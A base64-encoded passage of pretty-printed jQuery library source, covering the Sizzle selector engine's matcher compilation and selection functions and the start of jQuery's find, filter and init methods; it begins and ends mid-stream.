ICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZTogYywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiBnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1hdGNoZXM6IGUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaCA9IGguc2xpY2UoYy5sZW5ndGgpKTsKICAgICAgICAgICAgICAgICAgICBpZiAoIWMpCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gYiA/IGgubGVuZ3RoIDogaCA/IGdiLmVycm9yKGEpIDogeihhLCBpKS5zbGljZSgwKQogICAgICAgICAgICB9CiAgICAgICAgOwogICAgICAgIGZ1bmN0aW9uIHJiKGEpIHsKICAgICAgICAgICAgZm9yICh2YXIgYiA9IDAsIGMgPSBhLmxlbmd0aCwgZCA9ICIiOyBjID4gYjsgYisrKQogICAgICAgICAgICAgICAgZCArPSBhW2JdLnZhbHVlOwogICAgICAgICAgICByZXR1cm4gZAogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiBzYihhLCBiLCBjKSB7CiAgICAgICAgICAgIHZhciBkID0gYi5kaXIKICAgICAgICAgICAgICAgICwgZSA9IGMgJiYgInBhcmVudE5vZGUiID09PSBkCiAgICAgICAgICAgICAgICAsIGYgPSB4Kys7CiAgICAgICAgICAgIHJldHVybiBiLmZpcnN0ID8gZnVuY3Rpb24oYiwgYywgZikgewogICAgICAgICAgICAgICAgICAgIHdoaWxlIChiID0gYltkXSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKDEgPT09IGIubm9kZVR5cGUgfHwgZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhKGIsIGMsIGYpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICA6IGZ1bmN0aW9uKGIsIGMsIGcpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgaCwgaSwgaiA9IFt3LCBmXTsKICAgICAgICAgICAgICAgICAgICBpZiAoZykgewogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoYiA9IGJbZF0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDEgPT09IGIubm9kZVR5cGUgfHwgZSkgJiYgYShiLCBjLCBnKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gITAKICAgICAgICAgICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGIgPSBiW2RdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKDEgPT09IGIubm9kZVR5cGUgfHwgZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpID0gYlt1XSB8fCAoYlt1XSA9IHt9KSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoaCA9IGlbZF0pICYmIGhbMF0gPT09IHcgJiYgaFsxXSA9PT0gZikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGpbMl0gPSBoWzJdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpW2RdID0gaiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgalsyXSA9IGEoYiwgYywgZykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiB0YihhKSB7CiAgICAgICAgICAgIHJldHVybiBhLmxlbmd0aCA+IDEgPyBmdW5jdGlvbihiLCBjLCBkKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGUgPSBhLmxlbmd0aDsKICAgICAgICAgICAgICAgICAgICB3aGlsZSAoZS0tKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWFbZV0oYiwgYywgZCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gITE7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICA6IGFbMF0KICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gdWIoYSwgYiwgYykgewogICAgICAgICAgICBmb3IgKHZhciBkID0gMCwgZSA9IGIubGVuZ3RoOyBlID4gZDsgZCsrKQogICAgICAgICAgICAgICAgZ2IoYSwgYltkXSwgYyk7CiAgICAgICAgICAgIHJldHVybiBjCiAgICAgICAgfQogICAgICAgIGZ1bmN0aW9uIHZiKGEsIGIsIGMsIGQsIGUpIHsKICAgICAgICAgICAgZm9yICh2YXIgZiwgZyA9IFtdLCBoID0gMCwgaSA9IGEubGVuZ3RoLCBqID0gbnVsbCAhPSBiOyBpID4gaDsgaCsrKQogICAgICAgICAgICAgICAgKGYgPSBhW2hdKSAmJiAoIWMgfHwgYyhmLCBkLCBlKSkgJiYgKGcucHVzaChmKSwKICAgICAgICAgICAgICAgIGogJiYgYi5wdXNoKGgpKTsKICAgICAgICAgICAgcmV0dXJuIGcKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24gd2IoYSwgYiwgYywgZCwgZSwgZikgewogICAgICAgICAgICByZXR1cm4gZCAmJiAhZFt1XSAmJiAoZCA9IHdiKGQpKSwKICAgICAgICAgICAgZSAmJiAhZVt1XSAmJiAoZSA9IHdiKGUsIGYpKSwKICAgICAgICAgICAgICAgIGliKGZ1bmN0aW9uKGYsIGcsIGgsIGkpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgaiwgaywgbCwgbSA9IFtdLCBuID0gW10sIG8gPSBnLmxlbmd0aCwgcCA9IGYgfHwgdWIoYiB8fCAiKiIsIGgubm9kZVR5cGUgPyBbaF0gOiBoLCBbXSksIHEgPSAhYSB8fCAhZiAmJiBiID8gcCA6IHZiKHAsIG0sIGEsIGgsIGkpLCByID0gYyA/IGUgfHwgKGYgPyBhIDogbyB8fCBkKSA/IFtdIDogZyA6IHE7CiAgICAgICAgICAgICAgICAgICAgaWYgKGMgJiYgYyhxLCByLCBoLCBpKSwKICAgICAgICAgICAgICAgICAgICAgICAgZCkgewogICAgICAgICAgICAgICAgICAgICAgICBqID0gdmIociwgbiksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkKGosIFtdLCBoLCBpKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGsgPSBqLmxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGstLSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChsID0galtrXSkgJiYgKHJbbltrXV0gPSAhKHFbbltrXV0gPSBsKSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKGYpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGUgfHwgYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqID0gW10sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGsgPSByLmxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoay0tKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAobCA9IHJba10pICYmIGoucHVzaChxW2tdID0gbCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZShudWxsLCByID0gW10sIGosIGkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBrID0gci5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoay0tKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChsID0gcltrXSkgJiYgKGogPSBlID8gSihmLCBsKSA6IG1ba10pID4gLTEgJiYgKGZbal0gPSAhKGdbal0gPSBsKSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0gZWxzZQogICAgICAgICAgICAgICAgICAgICAgICByID0gdmIociA9PT0gZyA/IHIuc3BsaWNlKG8sIHIubGVuZ3RoKSA6IHIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZSA/IGUobnVsbCwgZywgciwgaSkgOiBILmFwcGx5KGcsIHIpCiAgICAgICAgICAgICAgICB9KQogICAgICAgIH0KICAgICAgICBmdW5jdGlvbiB4YihhKSB7CiAgICAgICAgICAgIGZvciAodmFyIGIsIGMsIGUsIGYgPSBhLmxlbmd0aCwgZyA9IGQucmVsYXRpdmVbYVswXS50eXBlXSwgaCA9IGcgfHwgZC5yZWxhdGl2ZVsiICJdLCBpID0gZyA/IDEgOiAwLCBrID0gc2IoZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuIGEgPT09IGIKICAgICAgICAgICAgfSwgaCwgITApLCBsID0gc2IoZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuIEooYiwgYSkgPiAtMQogICAgICAgICAgICB9LCBoLCAhMCksIG0gPSBbZnVuY3Rpb24oYSwgYywgZCkgewogICAgICAgICAgICAgICAgdmFyIGUgPSAhZyAmJiAoZCB8fCBjICE9PSBqKSB8fCAoKGIgPSBjKS5ub2RlVHlwZSA/IGsoYSwgYywgZCkgOiBsKGEsIGMsIGQpKTsKICAgICAgICAgICAgICAgIHJldHVybiBiID0gbnVsbCwKICAgICAgICAgICAgICAgICAgICBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgXTsgZiA+IGk7IGkrKykKICAgICAgICAgICAgICAgIGlmIChjID0gZC5yZWxhdGl2ZVthW2ldLnR5cGVdKQogICAgICAgICAgICAgICAgICAgIG0gPSBbc2IodGIobSksIGMpXTsKICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmIChjID0gZC5maWx0ZXJbYVtpXS50eXBlXS5hcHBseShudWxsLCBhW2ldLm1hdGNoZXMpLAogICAgICAgICAgICAgICAgICAgICAgICBjW3VdKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciAoZSA9ICsraTsgZiA+IGU7IGUrKykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkLnJlbGF0aXZlW2FbZV0udHlwZV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB3YihpID4gMSAmJiB0YihtKSwgaSA+IDEgJiYgcmIoYS5zbGljZSgwLCBpIC0gMSkuY29uY2F0KHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlOiAiICIgPT09IGFbaSAtIDJdLnR5cGUgPyAiKiIgOiAiIgogICAgICAgICAgICAgICAgICAgICAgICB9KSkucmVwbGFjZShSLCAiJDEiKSwgYywgZSA+IGkgJiYgeGIoYS5zbGljZShpLCBlKSksIGYgPiBlICYmIHhiKGEgPSBhLnNsaWNlKGUpKSwgZiA+IGUgJiYgcmIoYSkpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIG0ucHVzaChjKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gdGIobSkKICAgICAgICB9CiAgICAgICAgZnVuY3Rpb24geWIoYSwgYikgewogICAgICAgICAgICB2YXIgYyA9IGIubGVuZ3RoID4gMAogICAgICAgICAgICAgICAgLCBlID0gYS5sZW5ndGggPiAwCiAgICAgICAgICAgICAgICAsIGYgPSBmdW5jdGlvbihmLCBnLCBoLCBpLCBrKSB7CiAgICAgICAgICAgICAgICB2YXIgbCwgbSwgbywgcCA9IDAsIHEgPSAiMCIsIHIgPSBmICYmIFtdLCBzID0gW10sIHQgPSBqLCB1ID0gZiB8fCBlICYmIGQuZmluZC5UQUcoIioiLCBrKSwgdiA9IHcgKz0gbnVsbCA9PSB0ID8gMSA6IE1hdGgucmFuZG9tKCkgfHwgLjEsIHggPSB1Lmxlbmd0aDsKICAgICAgICAgICAgICAgIGZvciAoayAmJiAoaiA9IGcgIT09IG4gJiYgZyk7IHEgIT09IHggJiYgbnVsbCAhPSAobCA9IHVbcV0pOyBxKyspIHsKICAgICAgICAgICAgICAgICAgICBpZiAoZSAmJiBsKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSAwOwogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAobyA9IGFbbSsrXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChvKGwsIGcsIGgpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaS5wdXNoKGwpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGsgJiYgKHcgPSB2KQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjICYmICgobCA9ICFvICYmIGwpICYmIHAtLSwKICAgICAgICAgICAgICAgICAgICBmICYmIHIucHVzaChsKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChwICs9IHEsCiAgICAgICAgICAgICAgICBjICYmIHEgIT09IHApIHsKICAgICAgICAgICAgICAgICAgICBtID0gMDsKICAgICAgICAgICAgICAgICAgICB3aGlsZSAobyA9IGJbbSsrXSkKICAgICAgICAgICAgICAgICAgICAgICAgbyhyLCBzLCBnLCBoKTsKICAgICAgICAgICAgICAgICAgICBpZiAoZikgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAocCA+IDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAocS0tKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbcV0gfHwgc1txXSB8fCAoc1txXSA9IEYuY2FsbChpKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHMgPSB2YihzKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBILmFwcGx5KGksIHMpLAogICAgICAgICAgICAgICAgICAgIGsgJiYgIWYgJiYgcy5sZW5ndGggPiAwICYmIHAgKyBiLmxlbmd0aCA+IDEgJiYgZ2IudW5pcXVlU29ydChpKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuIGsgJiYgKHcgPSB2LAogICAgICAgICAgICAgICAgICAgIGogPSB0KSwKICAgICAgICAgICAgICAgICAgICByCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIHJldHVybiBjID8gaWIoZikgOiBmCiAgICAgICAgfQogICAgICAgIHJldHVybiBoID0gZ2IuY29tcGlsZSA9IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgdmFyIGMsIGQgPSBbXSwgZSA9IFtdLCBmID0gQVthICsgIiAiXTsKICAgICAgICAgICAgaWYgKCFmKSB7CiAgICAgICAgICAgICAgICBiIHx8IChiID0gZyhhKSksCiAgICAgICAgICAgICAgICAgICAgYyA9IGIubGVuZ3RoOwogICAgICAgICAgICAgICAgd2hpbGUgKGMtLSkKICAgICAgICAgICAgICAgICAgICBmID0geGIoYltjXSksCiAgICAgICAgICAgICAgICAgICAgICAgIGZbdV0gPyBkLnB1c2goZikgOiBlLnB1c2goZik7CiAgICAgICAgICAgICAgICBmID0gQShhLCB5YihlLCBkKSksCiAgICAgICAgICAgICAgICAgICAgZi5zZWxlY3RvciA9IGEKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZgogICAgICAgIH0KICAgICAgICAgICAgLAogICAgICAgICAgICBpID0gZ2Iuc2VsZWN0ID0gZnVuY3Rpb24oYSwgYiwgZSwgZikgewogICAgICAgICAgICAgICAgdmFyIGksIGosIGssIGwsIG0sIG4gPSAiZnVuY3Rpb24iID09IHR5cGVvZiBhICYmIGEsIG8gPSAhZiAmJiBnKGEgPSBuLnNlbGVjdG9yIHx8IGEpOwogICAgICAgICAgICAgICAgaWYgKGUgPSBlIHx8IFtdLAogICAgICAgICAgICAgICAgMSA9PT0gby5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoaiA9IG9bMF0gPSBvWzBdLnNsaWNlKDApLAogICAgICAgICAgICAgICAgICAgIGoubGVuZ3RoID4gMiAmJiAiSUQiID09PSAoayA9IGpbMF0pLnR5cGUgJiYgYy5nZXRCeUlkICYmIDkgPT09IGIubm9kZVR5cGUgJiYgcCAmJiBkLnJlbGF0aXZlW2pbMV0udHlwZV0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGIgPSAoZC5maW5kLklEKGsubWF0Y2hlc1swXS5yZXBsYWNlKGNiLCBkYiksIGIpIHx8IFtdKVswXSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICFiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGU7CiAgICAgICAgICAgICAgICAgICAgICAgIG4gJiYgKGIgPSBiLnBhcmVudE5vZGUpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGEuc2xpY2Uoai5zaGlmdCgpLnZhbHVlLmxlbmd0aCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaSA9IFgubmVlZHNDb250ZXh0LnRlc3QoYSkgPyAwIDogai5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGktLSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoayA9IGpbaV0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkLnJlbGF0aXZlW2wgPSBrLnR5cGVdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgobSA9IGQuZmluZFtsXSkgJiYgKGYgPSBtKGsubWF0Y2hlc1swXS5yZXBsYWNlKGNiLCBkYiksIGFiLnRlc3QoalswXS50eXBlKSAmJiBwYihiLnBhcmVudE5vZGUpIHx8IGIpKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGouc3BsaWNlKGksIDEpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEgPSBmLmxlbmd0aCAmJiByYihqKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAhYSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gSC5hcHBseShlLCBmKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gKG4gfHwgaChhLCBvKSkoZiwgYiwgIXAsIGUsIGFiLnRlc3QoYSkgJiYgcGIoYi5wYXJlbnROb2RlKSB8fCBiKSwKICAgICAgICAgICAgICAgICAgICBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgLAogICAgICAgICAgICBjLnNvcnRTdGFibGUgPSB1LnNwbGl0KCIiKS5zb3J0KEIpLmpvaW4oIiIpID09PSB1LAogICAgICAgICAgICBjLmRldGVjdER1cGxpY2F0ZXMgPSAhIWwsCiAgICAgICAgICAgIG0oKSwKICAgICAgICAgICAgYy5zb3J0RGV0YWNoZWQgPSBqYihmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gMSAmIGEuY29tcGFyZURvY3VtZW50UG9zaXRpb24obi5jcmVhdGVFbGVtZW50KCJkaXYiKSkKICAgICAgICAgICAgfSksCiAgICAgICAgamIoZnVuY3Rpb24oYSkgewogICAgICAgICAgICByZXR1cm4gYS5pbm5lckhUTUwgPSAiPGEgaHJlZj0nIyc+PC9hPiIsCiAgICAgICAgICAgICIjIiA9PT0gYS5maXJzdENoaWxkLmdldEF0dHJpYnV0ZSgiaHJlZiIpCiAgICAgICAgfSkgfHwga2IoInR5cGV8aHJlZnxoZWlnaHR8d2lkdGgiLCBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgIHJldHVybiBjID8gdm9pZCAwIDogYS5nZXRBdHRyaWJ1dGUoYiwgInR5cGUiID09PSBiLnRvTG93ZXJDYXNlKCkgPyAxIDogMikKICAgICAgICB9KSwKICAgICAgICBjLmF0dHJpYnV0ZXMgJiYgamIoZnVuY3Rpb24oYSkgewogICAgICAgICAgICByZXR1cm4gYS5pbm5lckhUTUwgPSAiPGlucHV0Lz4iLAogICAgICAgICAgICAgICAgYS5maXJzdENoaWxkLnNldEF0dHJpYnV0ZSgidmFsdWUiLCAiIiksCiAgICAgICAgICAgICIiID09PSBhLmZpcnN0Q2hpbGQuZ2V0QXR0cmlidXRlKCJ2YWx1ZSIpCiAgICAgICAgfSkgfHwga2IoInZhbHVlIiwgZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICByZXR1cm4gYyB8fCAiaW5wdXQiICE9PSBhLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPyB2b2lkIDAgOiBhLmRlZmF1bHRWYWx1ZQogICAgICAgIH0pLAogICAgICAgIGpiKGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgcmV0dXJuIG51bGwgPT0gYS5nZXRBdHRyaWJ1dGUoImRpc2FibGVkIikKICAgICAgICB9KSB8fCBrYihLLCBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgIHZhciBkOwogICAgICAgICAgICByZXR1cm4gYyA/IHZvaWQgMCA6IGFbYl0gPT09ICEwID8gYi50b0xvd2VyQ2FzZSgpIDogKGQgPSBhLmdldEF0dHJpYnV0ZU5vZGUoYikpICYmIGQuc3BlY2lmaWVkID8gZC52YWx1ZSA6IG51bGwKICAgICAgICB9KSwKICAgICAgICAgICAgZ2IKICAgIH0oYSk7CiAgICBuLmZpbmQgPSB0LAogICAgICAgIG4uZXhwciA9IHQuc2VsZWN0b3JzLAogICAgICAgIG4uZXhwclsiOiJdID0gbi5leHByLnBzZXVkb3MsCiAgICAgICAgbi51bmlxdWUgPSB0LnVuaXF1ZVNvcnQsCiAgICAgICAgbi50ZXh0ID0gdC5nZXRUZXh0LAogICAgICAgIG4uaXNYTUxEb2MgPSB0LmlzWE1MLAogICAgICAgIG4uY29udGFpbnMgPSB0LmNvbnRhaW5zOwogICAgdmFyIHUgPSBuLmV4cHIubWF0Y2gubmVlZHNDb250ZXh0CiAgICAgICAgLCB2ID0gL148KFx3KylccypcLz8+KD86PFwvXDE+fCkkLwogICAgICAgICwgdyA9IC9eLlteOiNcW1wuLF0qJC87CiAgICBmdW5jdGlvbiB4KGEsIGIsIGMpIHsKICAgICAgICBpZiAobi5pc0Z1bmN0aW9uKGIpKQogICAgICAgICAgICByZXR1cm4gbi5ncmVwKGEsIGZ1bmN0aW9uKGEsIGQpIHsKICAgICAgICAgICAgICAgIHJldHVybiAhIWIuY2FsbChhLCBkLCBhKSAhPT0gYwogICAgICAgICAgICB9KTsKICAgICAgICBpZiAoYi5ub2RlVHlwZSkKICAgICAgICAgICAgcmV0dXJuIG4uZ3JlcChhLCBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gYSA9PT0gYiAhPT0gYwogICAgICAgICAgICB9KTsKICAgICAgICBpZiAoInN0cmluZyIgPT0gdHlwZW9mIGIpIHsKICAgICAgICAgICAgaWYgKHcudGVzdChiKSkKICAgICAgICAgICAgICAgIHJldHVybiBuLmZpbHRlcihiLCBhLCBjKTsKICAgICAgICAgICAgYiA9IG4uZmlsdGVyKGIsIGEpCiAgICAgICAgfQogICAgICAgIHJldHVybiBuLmdyZXAoYSwgZnVuY3Rpb24oYSkgewogICAgICAgICAgICByZXR1cm4gZy5jYWxsKGIsIGEpID49IDAgIT09IGMKICAgICAgICB9KQogICAgfQogICAgbi5maWx0ZXIgPSBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgdmFyIGQgPSBiWzBdOwogICAgICAgIHJldHVybiBjICYmIChhID0gIjpub3QoIiArIGEgKyAiKSIpLAogICAgICAgICAgICAxID09PSBiLmxlbmd0aCAmJiAxID09PSBkLm5vZGVUeXBlID8gbi5maW5kLm1hdGNoZXNTZWxlY3RvcihkLCBhKSA/IFtkXSA6IFtdIDogbi5maW5kLm1hdGNoZXMoYSwgbi5ncmVwKGIsIGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHJldHVybiAxID09PSBhLm5vZGVUeXBlCiAgICAgICAgICAgIH0pKQogICAgfQogICAgICAgICwKICAgICAgICBuLmZuLmV4dGVuZCh7CiAgICAgICAgICAgIGZpbmQ6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHZhciBiLCBjID0gdGhpcy5sZW5ndGgsIGQgPSBbXSwgZSA9IHRoaXM7CiAgICAgICAgICAgICAgICBpZiAoInN0cmluZyIgIT0gdHlwZW9mIGEpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMucHVzaFN0YWNrKG4oYSkuZmlsdGVyKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGIgPSAwOyBjID4gYjsgYisrKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKG4uY29udGFpbnMoZVtiXSwgdGhpcykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEwCiAgICAgICAgICAgICAgICAgICAgfSkpOwogICAgICAgICAgICAgICAgZm9yIChiID0gMDsgYyA+IGI7IGIrKykKICAgICAgICAgICAgICAgICAgICBuLmZpbmQoYSwgZVtiXSwgZCk7CiAgICAgICAgICAgICAgICByZXR1cm4gZCA9IHRoaXMucHVzaFN0YWNrKGMgPiAxID8gbi51bmlxdWUoZCkgOiBkKSwKICAgICAgICAgICAgICAgICAgICBkLnNlbGVjdG9yID0gdGhpcy5zZWxlY3RvciA/IHRoaXMuc2VsZWN0b3IgKyAiICIgKyBhIDogYSwKICAgICAgICAgICAgICAgICAgICBkCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIGZpbHRlcjogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMucHVzaFN0YWNrKHgodGhpcywgYSB8fCBbXSwgITEpKQogICAgICAgICAgICB9LAogICAgICAgICAgICBub3Q6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHJldHVybiB0aGlzLnB1c2hTdGFjayh4KHRoaXMsIGEgfHwgW10sICEwKSkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgaXM6IGZ1bmN0aW9uKGEpIHsKICAgICAgICAgICAgICAgIHJldHVybiAhIXgodGhpcywgInN0cmluZyIgPT0gdHlwZW9mIGEgJiYgdS50ZXN0KGEpID8gbihhKSA6IGEgfHwgW10sICExKS5sZW5ndGgKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgdmFyIHksIHogPSAvXig/OlxzKig8W1x3XFddKz4pW14+XSp8IyhbXHctXSopKSQvLCBBID0gbi5mbi5pbml0ID0gZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICB2YXIgYywgZDsKICAgICAgICAgICAgaWYgKCFhKQogICAgICAgICAgICAgICAgcmV0dXJuIHRoaXM7CiAgICAgICAgICAgIGlmICgic3RyaW5nIiA9PSB0eXBlb2YgYSkgewogICAgICAgICAgICAgICAgaWYgKGMgPSAiPCIgPT09IGFbMF0gJiYgIj4iID09PSBhW2EubGVuZ3RoIC0gMV0gJiYgYS5sZW5ndGggPj0gMyA/IFtudWxsLCBhLCBudWxsXSA6IHouZXhlYyhhKSwKICAgICAgICAgICAgICAgICFjIHx8ICFjWzFdICYmIGIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICFiIHx8IGIuanF1ZXJ5ID8gKGIgfHwgeSkuZmluZChhKSA6IHRoaXMuY29uc3RydWN0b3IoYikuZmluZChhKTsKICAgICAgICAgICAgICAgIGlmIChjWzFdKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGIgPSBiIGluc3RhbmNlb2YgbiA/IGJbMF0gOiBiLAogICAgICAgICAgICAgICAgICAgICAgICBuLm1lcmdlKHRoaXMsIG4ucGFyc2VIVE1MKGNbMV0sIGIgJiYgYi5ub2RlVHlwZSA/IGIub3duZXJEb2N1bWVudCB8fCBiIDogbCwgITApKSwKICAgICAgICAgICAgICAgICAgICB2LnRlc3QoY1sxXSkgJiYgbi5pc1BsYWluT2JqZWN0KGIpKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGMgaW4gYikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG4uaXNGdW5jdGlvbih0aGlzW2NdKSA/IHRoaXNbY10oYltjXSkgOiB0aGlzLmF0dHIoYywgYltjXSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiBkID0gbC5nZXRFbGVtZW50QnlJZChjWzJdKSwKICAgICAgICAgICAgICAgIGQgJiYgZC5wYXJlbnROb2RlICYmICh0aGlzLmxlbmd0aCA9IDEsCiAgICAgICAgICAgICAgICAgICAgdGhpc1swXSA9IGQpLAogICAgICAgICAgICAgICAgICAgIHRoaXMuY29udGV4dCA9IGwsCiAgICAgICAgICAgICAgICAgICAgdGhpcy5zZWxlY3RvciA9IGEsCiAgICAgICAgICAgICAgICAgICAgdGhpcwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBhLm5vZGVUeXBlID8gKHRoaXMuY29udGV4dCA9IHRoaXNbMF